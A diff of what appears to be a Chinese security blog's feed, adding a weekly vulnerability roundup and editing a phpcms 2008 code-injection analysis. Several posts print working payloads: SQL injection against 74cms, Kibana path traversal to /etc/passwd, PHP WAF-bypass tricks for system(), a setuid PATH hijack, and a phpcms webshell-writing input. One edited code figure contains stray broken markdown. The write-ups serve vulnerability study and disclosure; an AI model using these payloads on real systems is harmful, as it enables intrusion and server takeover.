@@ -241,11 +241,183 @@
   </entry>
   
   <entry>
+    <title>【Security Weekly】2018/12/23 - 2018/12/30</title>
+    <link href="http://chybeta.github.io/2018/12/28/%E3%80%90Security-Weekly%E3%80%912018-12-23-2018-12-30/"/>
+    <id>http://chybeta.github.io/2018/12/28/【Security-Weekly】2018-12-23-2018-12-30/</id>
+    <published>2018-12-28T14:57:38.000Z</published>
+    <updated>2018-12-30T15:27:14.946Z</updated>
+    
+    <content type="html"><![CDATA[<p>简单记录，略过即可。<br><a id="more"></a></p>
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="1-gogs-gitea-RCE-CVE-2018-20303"><a href="#1-gogs-gitea-RCE-CVE-2018-20303" class="headerlink" title="1. gogs/gitea RCE CVE-2018-20303"></a>1. gogs/gitea RCE CVE-2018-20303</h2><p>文章：<a href="https://xz.aliyun.com/t/3725" target="_blank" rel="external">https://xz.aliyun.com/t/3725</a></p>
+<p>基本原理跨目录上传伪造的管理员session文件，覆盖当前的session文件，导致权限提升。最初的issue地址在 <a href="https://github.com/go-gitea/gitea/issues/5569" target="_blank" rel="external">https://github.com/go-gitea/gitea/issues/5569</a> ，在初步修复后被发现绕过方法见 <a href="https://github.com/gogs/gogs/commit/8c8c37a66b4cef6fc8a995ab1b4fd6e530c49c51" target="_blank" rel="external">https://github.com/gogs/gogs/commit/8c8c37a66b4cef6fc8a995ab1b4fd6e530c49c51</a> 。</p>
+<p>类似相关漏洞：<a href="https://xz.aliyun.com/t/3168" target="_blank" rel="external">GOGS/Gitea任意代码执行(CVE-2018-18925/6)及利用流程</a></p>
+<h2 id="2-74cms-前台注入"><a href="#2-74cms-前台注入" class="headerlink" title="2. 74cms 前台注入"></a>2. 74cms 前台注入</h2><p>文章：<a href="https://xz.aliyun.com/t/3714" target="_blank" rel="external">https://xz.aliyun.com/t/3714</a></p>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://74cms.test/index.php?m=&amp;c=jobs&amp;a=jobs_list&amp;lat=23.176465&amp;range=20&amp;lng=113.35038* PI() / 180 - map_x PI() / 180) / 2),2))) 1000) AS map_range FROM qs_jobs_search j WHERE (extractvalue (1,concat(0x7e,(SELECT USER()), 0x7e))) -- a</div></pre></td></tr></table></figure></p>
+<h2 id="3-empirecms-后台getshell"><a href="#3-empirecms-后台getshell" class="headerlink" title="3. empirecms 后台getshell"></a>3. empirecms 后台getshell</h2><p>文章：<a href="https://xz.aliyun.com/t/3667" target="_blank" rel="external">https://xz.aliyun.com/t/3667</a></p>
+<p>两处后台getshell，都是文件包含。第一处在导入系统模型处，第二处在自定义页面。</p>
+<h2 id="4-LearnX控件的漏洞挖掘过程"><a href="#4-LearnX控件的漏洞挖掘过程" class="headerlink" title="4. LearnX控件的漏洞挖掘过程"></a>4. LearnX控件的漏洞挖掘过程</h2><p>文章：<a href="https://xz.aliyun.com/t/3708" target="_blank" rel="external">https://xz.aliyun.com/t/3708</a></p>
+<p>利用了<code>COMRaider</code>工具fuzz。</p>
+<h2 id="5-Elasticsearch-核心插件Kibana-本地文件包含漏洞"><a href="#5-Elasticsearch-核心插件Kibana-本地文件包含漏洞" class="headerlink" title="5. Elasticsearch 核心插件Kibana 本地文件包含漏洞"></a>5. Elasticsearch 核心插件Kibana 本地文件包含漏洞</h2><p>文章：<a href="https://www.anquanke.com/post/id/168291" target="_blank" rel="external">https://www.anquanke.com/post/id/168291</a></p>
+<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd</div></pre></td></tr></table></figure></p>
+<p>感觉鸡肋。需要登陆，包含<code>/etc/passwd</code>的话只会导致服务器错误，并不能读取内容。此外有文章说能RCE，但前提是要有上传<code>js</code>文件的点，然后再去包含这个<code>js</code>文件。</p>
+<h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><h2 id="1-利用Web应用中隐藏的文件夹和文件获取敏感信息"><a href="#1-利用Web应用中隐藏的文件夹和文件获取敏感信息" class="headerlink" title="1. 利用Web应用中隐藏的文件夹和文件获取敏感信息"></a>1. 利用Web应用中隐藏的文件夹和文件获取敏感信息</h2><p>文章：<a href="https://xz.aliyun.com/t/3677" target="_blank" rel="external">https://xz.aliyun.com/t/3677</a></p>
+<p>简单总结：</p>
+<ul>
+<li>源代码版本控制系统<ul>
+<li>git</li>
+<li>.gitignore</li>
+<li>svn</li>
+</ul>
+</li>
+<li>IDE (集成开发环境)配置文件<ul>
+<li>jetbrain全家桶</li>
+<li>netbeans</li>
+</ul>
+</li>
+<li>特定于项目和/或技术的配置和设置文件<ul>
+<li>nodejs项目的各种配置文件</li>
+<li>GitLab CI/CD .gitlab-ci.yml</li>
+<li>Ruby on Rails database.yml</li>
+<li>macOS .DS_Store</li>
+</ul>
+</li>
+</ul>
+<p>当然文章只总结了这么多，实际还有一大堆可能泄露的文件，按下不提。</p>
+<h2 id="2-如何绕过代码过滤和WAF规则远程执行PHP代码"><a href="#2-如何绕过代码过滤和WAF规则远程执行PHP代码" class="headerlink" title="2. 如何绕过代码过滤和WAF规则远程执行PHP代码"></a>2. 如何绕过代码过滤和WAF规则远程执行PHP代码</h2><p>文章：<a href="https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf" target="_blank" rel="external">https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf</a></p>
+<p>简单小记：</p>
+<ul>
+<li>system(“cat /etc$u/passwd”)</li>
+<li>利用php字符串转换：<ul>
+<li>八进制<code>\[0–7]{1,3}</code></li>
+<li>十六进制<code>\x[0-9A-Fa-f]{1,2}</code></li>
+<li>unicode <code>\u{[0-9A-Fa-f]+}</code></li>
+</ul>
+</li>
+<li>php中的 <code>$var(args);</code>和<code>&quot;string&quot;(args);</code><ul>
+<li>system(“ls”) -&gt; “system”(“ls”) -&gt; “\x73\x79\x73\x74\x65\x6d”(“ls”)</li>
+</ul>
+</li>
+<li>利用<code>()</code>： “system”(“ls”)  -&gt; (system)(ls);</li>
+<li>字符串拼接：(sy.(st).em)(ls)</li>
+<li>注释：sys./<em>test</em>/.tem(ls)</li>
+<li>利用函数定义列表数组：get_defined_functions<ul>
+<li>第一步获取system的索引：get_defined_functions()[internal] | grep ‘system’</li>
+<li>第二步调用：get_defined_functions()[internal]<a href="ls">1000</a></li>
+</ul>
+</li>
+<li>字符数组，拼凑。</li>
+</ul>
+<h1 id="Bug-Bounty"><a href="#Bug-Bounty" class="headerlink" title="Bug Bounty"></a>Bug Bounty</h1><h2 id="1-利用条件竞争获取money"><a href="#1-利用条件竞争获取money" class="headerlink" title="1. 利用条件竞争获取money"></a>1. 利用条件竞争获取money</h2><p>案例：<a href="https://hackerone.com/reports/429026" target="_blank" rel="external">https://hackerone.com/reports/429026</a></p>
+<p>Burp截取请求，右键<code>Copy as curl command</code>。然后 <code>(request) &amp; (request) &amp; (request) 。。。</code></p>
+<h2 id="2-基于setuid为root的程序的提权漏洞"><a href="#2-基于setuid为root的程序的提权漏洞" class="headerlink" title="2. 基于setuid为root的程序的提权漏洞"></a>2. 基于setuid为root的程序的提权漏洞</h2><p>地址：<a href="https://hackerone.com/reports/426944" target="_blank" rel="external">https://hackerone.com/reports/426944</a></p>
+<p><code>keybase-redirector</code>的setuid为root权限。它通过<code>相对路径</code>来调用<code>fusermount</code>程序，同时对环境变量<code>$PATH</code>没做足够的验证。因此可以自己编写一个<code>fusermount.c</code>并编译出可执行文件<code>fusermount</code>，在环境变量中添加当前所在目录，利用<code>keybase-redirector</code>来执行伪造的<code>fusermount</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">env PATH=.:$PATH /usr/bin/keybase-redirector /keybase</div></pre></td></tr></table></figure></p>
+<h2 id="3-HOST头伪造"><a href="#3-HOST头伪造" class="headerlink" title="3. HOST头伪造"></a>3. HOST头伪造</h2><p>案例：重置密码邮件连接 <a href="https://lightningsecurity.io/blog/host-header-injection/" target="_blank" rel="external">https://lightningsecurity.io/blog/host-header-injection/</a></p>
+<p>一些网站提供了动态子域名，比如 a.com ，你可以申请到 xxx.a.com。在重置密码时，网站 a.com 为了确认是哪个用户发起的请求，直接采用了客户端提供的<code>HOST</code>头部。通过伪造<code>HOST</code>头部，比如 <code>Host: b.com</code> ，服务器将组装重置密码链接：<code>http://b.com?reset_token=12345</code> ，并发往用户邮箱。当用户点击时，<code>b.com</code>即可获取到<code>reset_token</code>。</p>
+<h2 id="4-缓存投毒导致DDOS"><a href="#4-缓存投毒导致DDOS" class="headerlink" title="4. 缓存投毒导致DDOS"></a>4. 缓存投毒导致DDOS</h2><p>案例：<a href="https://hackerone.com/reports/409370" target="_blank" rel="external">https://hackerone.com/reports/409370</a><br>相关知识：<a href="https://xz.aliyun.com/t/2585" target="_blank" rel="external">https://xz.aliyun.com/t/2585</a>  <a href="https://xz.aliyun.com/t/2877" target="_blank" rel="external">https://xz.aliyun.com/t/2877</a></p>
+<p>添加头部<code>X-Forwarded-Port: 123</code>或者<code>X-Forwarded-Host: www.hackerone.com:123</code>  利用缓存使用户被重定向从而DDOS</p>
+<h2 id="5-wordpress-xmlrpc-php文件导致DDOS或爆破"><a href="#5-wordpress-xmlrpc-php文件导致DDOS或爆破" class="headerlink" title="5. wordpress xmlrpc.php文件导致DDOS或爆破"></a>5. wordpress xmlrpc.php文件导致DDOS或爆破</h2><p>案例： <a href="https://hackerone.com/reports/448524" target="_blank" rel="external">https://hackerone.com/reports/448524</a></p>
+<p>当发现<code>xmlrpc.php</code>时可以发送以下请求包来列举方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">POST /wp/xmlrpc.php HTTP/1.1</div><div class="line"></div><div class="line">&lt;methodCall&gt;</div><div class="line">&lt;methodName&gt;system.listMethods&lt;/methodName&gt;</div><div class="line">&lt;params&gt;&lt;/params&gt;</div><div class="line">&lt;/methodCall&gt;</div></pre></td></tr></table></figure></p>
+<p>如果获取到响应类似如下，说明xmlrpc启用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;methodResponse&gt;</div><div class="line">&lt;params&gt;</div><div class="line">&lt;param&gt;</div><div class="line">&lt;value&gt;</div><div class="line">&lt;array&gt;&lt;data&gt;</div><div class="line">&lt;value&gt;&lt;string&gt;pingback.ping&lt;/string&gt;&lt;/value&gt;</div><div class="line">&lt;/data&gt;&lt;/array&gt;</div><div class="line">&lt;/value&gt;</div><div class="line">&lt;/param&gt;</div><div class="line">&lt;/params&gt;</div><div class="line">&lt;/methodResponse&gt;</div></pre></td></tr></table></figure></p>
+<p>其中利用如<code>pingback.ping</code>或 <code>trackbacks</code>可造成DDOS</p>
+<h2 id="6-利用ASP-NET的LFI漏洞读取ASP-Secrets"><a href="#6-利用ASP-NET的LFI漏洞读取ASP-Secrets" class="headerlink" title="6. 利用ASP.NET的LFI漏洞读取ASP Secrets"></a>6. 利用ASP.NET的LFI漏洞读取ASP Secrets</h2><p>文章：<a href="http://docs.ioin.in/writeup/www.anquanke.com/_post_id_168302/index.html" target="_blank" rel="external">http://docs.ioin.in/writeup/www.anquanke.com/_post_id_168302/index.html</a></p>
+<ol>
+<li><p>服务端有一定的过滤，利用fuzz来进行测试绕过。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /utility/download.aspx?f=.[fuzz]./utility/download.aspx</div></pre></td></tr></table></figure>
+</li>
+<li><p>通过读取 <code>.ashx</code>文件或<code>dll</code>文件来获取处理程序的真实源代码。</p>
+</li>
+<li>重要的配置文件：web.config </li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;简单记录，略过即可。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Security Weekly" scheme="http://chybeta.github.io/categories/Security-Weekly/"/>
+    
+    
+      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="thinkphp" scheme="http://chybeta.github.io/tags/thinkphp/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>DiscuzX (before 41eb5) SSRF 分析</title>
+    <link href="http://chybeta.github.io/2018/12/14/DiscuzX-before-41eb5-SSRF-%E5%88%86%E6%9E%90/"/>
+    <id>http://chybeta.github.io/2018/12/14/DiscuzX-before-41eb5-SSRF-分析/</id>
+    <published>2018-12-14T15:14:39.000Z</published>
+    <updated>2018-12-18T13:35:24.406Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="SSRF" scheme="http://chybeta.github.io/tags/SSRF/"/>
+    
+      <category term="Discuz" scheme="http://chybeta.github.io/tags/Discuz/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Apache incubator-superset pickle反序列化 RCE 漏洞 -【CVE-2018-8021】</title>
+    <link href="http://chybeta.github.io/2018/12/03/Apache-incubator-superset-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E-%E3%80%90CVE-2018-8021%E3%80%91/"/>
+    <id>http://chybeta.github.io/2018/12/03/Apache-incubator-superset-pickle反序列化-RCE-漏洞-【CVE-2018-8021】/</id>
+    <published>2018-12-03T14:46:39.000Z</published>
+    <updated>2018-12-03T14:48:12.572Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
+<li><a href="https://github.com/r3dxpl0it/Apache-Superset-Remote-Code-Execution-PoC-CVE-2018-8021-/" target="_blank" rel="external">https://github.com/r3dxpl0it/Apache-Superset-Remote-Code-Execution-PoC-CVE-2018-8021-/</a></li>
+<li><a href="https://github.com/apache/incubator-superset/pull/4243" target="_blank" rel="external">https://github.com/apache/incubator-superset/pull/4243</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/r3dxpl0i
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="python" scheme="http://chybeta.github.io/tags/python/"/>
+    
+      <category term="rce" scheme="http://chybeta.github.io/tags/rce/"/>
+    
+      <category term="apache" scheme="http://chybeta.github.io/tags/apache/"/>
+    
+      <category term="superset" scheme="http://chybeta.github.io/tags/superset/"/>
+    
+      <category term="pickle" scheme="http://chybeta.github.io/tags/pickle/"/>
+    
+      <category term="反序列化" scheme="http://chybeta.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+  </entry>
+  
+  <entry>
     <title>phpcms 2008 type.php 前台代码注入getshell漏洞分析</title>
     <link href="http://chybeta.github.io/2018/11/29/phpcms-2008-type-php-%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     <id>http://chybeta.github.io/2018/11/29/phpcms-2008-type-php-前台代码注入getshell漏洞分析/</id>
     <published>2018-11-29T12:52:25.000Z</published>
-    <updated>2018-11-29T12:56:23.307Z</updated>
+    <updated>2018-12-22T09:35:31.155Z</updated>
     
     <content type="html"><![CDATA[<p>phpcms 2008 type.php 前台代码注入getshell漏洞分析</p>
 <a id="more"></a>
@@ -258,8 +430,7 @@
 <p>重点看<code>$content = ($istag || substr($template, 0, 4) == &#39;tag_&#39;)</code>这一句。由于<code>$template</code>可控，只要<code>$template</code>以<code>tag_</code>开头，就可以使得此处的三元表达式进入到第一个分支中，即相当于：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$content = <span class="string">'&lt;?php function _tag_'</span>.$module.<span class="string">'_'</span>.$template.<span class="string">'($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span></div></pre></td></tr></table></figure></p>
 <p>由于<code>$template</code>未经过滤，被直接拼接到内容中，所以如果指定<code>tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss</code> ，则拼接后的结果为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$content = <span class="string">'&lt;?php function _tag_phpcms_tag_()&#123;&#125;;@unlink(_FILE_);assert($_GET[1]);&#123;//../rss($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span></div></pre></td></tr></table></figure></p>
 <p>可以看到一句话木马已经写入了<code>$content</code>，之后<code>file_put_contents($compiledtplfile, $content);</code>将内容写入文件。</p>
-<p>回到前面的<code>template_compile</code>函数中，<code>TPL_CACHEPATH</code>为常量<code>PHPCMS_ROOT.&#39;data/cache_template/</code>; 可知 <code>$compiledtplfile</code> 为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div></pre></td></tr></table></figure></p>
-<p>即：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$compiledtplfile = <span class="string">'data/cache_template/phpcms_tag_()&#123;&#125;;@unlink(_FILE_);assert($_GET[1]);&#123;//../rss.tpl.php'</span>;</div></pre></td></tr></table></figure></p>
+<p>回到前面的<code>template_compile</code>函数中，<code>TPL_CACHEPATH</code>为常量<code>PHPCMS_ROOT.&#39;data/cache_template/</code>; 可知 <code>$compiledtplfile</code> 为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div><div class="line">```<span class="number">4</span></div><div class="line"></div><div class="line">即：</div><div class="line">```php</div><div class="line">$compiledtplfile = <span class="string">'data/cache_template/phpcms_tag_()&#123;&#125;;@unlink(_FILE_);assert($_GET[1]);&#123;//../rss.tpl.php'</span>;</div></pre></td></tr></table></figure></p>
 <p>所以payload末尾的<code>../</code>利用目录穿越使得最后的<code>$compiledtplfile</code>为<code>&#39;data/cache_template/rss.tpl.php</code></p>
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20181129/1.png?raw=true" alt=""></p>
 <p>为了解析不出错，payload末尾处的<code>//</code>注释了拼接后的其余部分，如上图。</p>
@@ -1340,11 +1511,11 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
+      <category term="apache" scheme="http://chybeta.github.io/tags/apache/"/>
+    
       <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="xxe" scheme="http://chybeta.github.io/tags/xxe/"/>
-    
-      <category term="apache" scheme="http://chybeta.github.io/tags/apache/"/>
     
       <category term="solr" scheme="http://chybeta.github.io/tags/solr/"/>
     
@@ -1572,9 +1743,9 @@
     
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
       <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
+    
+      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
       <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
     
@@ -1643,195 +1814,6 @@
       <category term="struts2" scheme="http://chybeta.github.io/tags/struts2/"/>
     
       <category term="s2" scheme="http://chybeta.github.io/tags/s2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>GitList 0.6 Unauthenticated RCE 分析</title>
-    <link href="http://chybeta.github.io/2018/04/30/GitList-0-6-Unauthenticated-RCE-%E5%88%86%E6%9E%90/"/>
-    <id>http://chybeta.github.io/2018/04/30/GitList-0-6-Unauthenticated-RCE-分析/</id>
-    <published>2018-04-30T04:25:26.000Z</published>
-    <updated>2018-05-01T12:14:53.244Z</updated>
-    
-    <content type="html"><![CDATA[<p>GitList 0.6 Unauthenticated RCE 分析<br><a id="more"></a></p>
-<h1 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h1><p>Gitlist 0.6 下载地址： <a href="https://github.com/klaussilveira/gitlist/releases/download/0.6.0/gitlist-0.6.0.tar.gz" target="_blank" rel="external">https://github.com/klaussilveira/gitlist/releases/download/0.6.0/gitlist-0.6.0.tar.gz</a></p>
-<p>解压出来后，将其中的config.ini-example重命名为config.ini，并将其中第四行修改指向repo的地址，以我为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">repositories[] = &apos;/home/chybeta/test/&apos;</div></pre></td></tr></table></figure></p>
-<p>在<code>test</code>目录下建立repo：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mkdir gitlist_rce</div><div class="line">cd gitlist_rce</div><div class="line">echo &quot;chybeta&quot; &gt; README.md</div><div class="line">git init</div><div class="line">git add *</div><div class="line">git commit -m &quot;gitlist_rce&quot;</div></pre></td></tr></table></figure></p>
-<p>其余问题，可以直接参考<a href="https://www.sitepoint.com/installing-gitlist-for-local-repos/" target="_blank" rel="external">Installing GitList for Local Reposs</a></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/1.png?raw=true" alt=""></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在 gitlist/src/Controller/TreeController.php:51行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span></div><div class="line">$route-&gt;post(<span class="string">'&#123;repo&#125;/tree/&#123;branch&#125;/search'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $repo, $branch = <span class="string">''</span>, $tree = <span class="string">''</span>)</span> <span class="title">use</span> <span class="params">($app)</span> </span>&#123;</div><div class="line">    $repository = $app[<span class="string">'git'</span>]-&gt;getRepositoryFromName($app[<span class="string">'git.repos'</span>], $repo);</div><div class="line">    <span class="keyword">if</span> (!$branch) &#123;</div><div class="line">        $branch = $repository-&gt;getHead();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $query = $request-&gt;get(<span class="string">'query'</span>);</div><div class="line">    $breadcrumbs = [[<span class="string">'dir'</span> =&gt; <span class="string">'Search results for: '</span> . $query, <span class="string">'path'</span> =&gt; <span class="string">''</span>]];</div><div class="line">    $results = $repository-&gt;searchTree($query, $branch);</div><div class="line">...</div></pre></td></tr></table></figure></p>
-<p>当我们在repo中进行搜索时，以搜索字符串”chybeta”为例<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/2.png?raw=true" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST /gitlist/gitlist_rce/tree/master/search HTTP/1.1</div><div class="line"></div><div class="line">query=chybeta</div></pre></td></tr></table></figure>
-<p>则对应的变量即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">repo =&gt; gitlist_rce</div><div class="line">branch =&gt; master</div><div class="line">query =&gt; chybeta</div></pre></td></tr></table></figure></p>
-<p>进入到searchTree函数中，即gitlist/src/Git/Repository.php第320行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">searchTree</span><span class="params">($query, $branch)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($query)) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $query = escapeshellarg($query);</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            $results = <span class="keyword">$this</span>-&gt;getClient()-&gt;run(<span class="keyword">$this</span>, <span class="string">"grep -i --line-number &#123;$query&#125; $branch"</span>);</div><div class="line">        &#125; <span class="keyword">catch</span> (\RuntimeException $e) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
-<p><code>query</code>参数经过了<code>escapeshellarg</code>函数的过滤，<a href="http://php.net/manual/zh/function.escapeshellarg.php" target="_blank" rel="external">官方文档</a>:</p>
-<blockquote>
-<p>escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数。 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符.</p>
-</blockquote>
-<p>之后进入run方法，gitlist/vendor/klaussilveira/gitter/lib/Gitter/Client.php:63：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">($repository, $command)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (version_compare(<span class="keyword">$this</span>-&gt;getVersion(), <span class="string">'1.7.2'</span>, <span class="string">'&gt;='</span>)) &#123;</div><div class="line">        $command = <span class="string">'-c "color.ui"=false '</span> . $command;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    $process = <span class="keyword">new</span> Process(<span class="keyword">$this</span>-&gt;getPath() . <span class="string">' '</span> . $command, $repository-&gt;getPath());</div><div class="line">    $process-&gt;setTimeout(<span class="number">180</span>);</div><div class="line">    $process-&gt;run();</div></pre></td></tr></table></figure></p>
-<p>在<code>$process = new Process()</code>处最终构成的命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/bin/git grep -i --line-number &apos;chybeta&apos; master</div></pre></td></tr></table></figure></p>
-<p>在<a href="https://git-scm.com/docs/git-grep#git-grep---open-files-in-pagerltpagergt" target="_blank" rel="external"><code>git grep</code>命令</a>中提到：</p>
-<blockquote>
-<p>Open the matching files in the pager (not the output of grep). If the pager happens to be “less” or “vi”, and the user specified only one pattern, the first file is positioned at the first match automatically. The pager argument is optional; if specified, it must be stuck to the option without a space. If pager is unspecified, the default pager will be used (see core.pager in git-config[1]).</p>
-</blockquote>
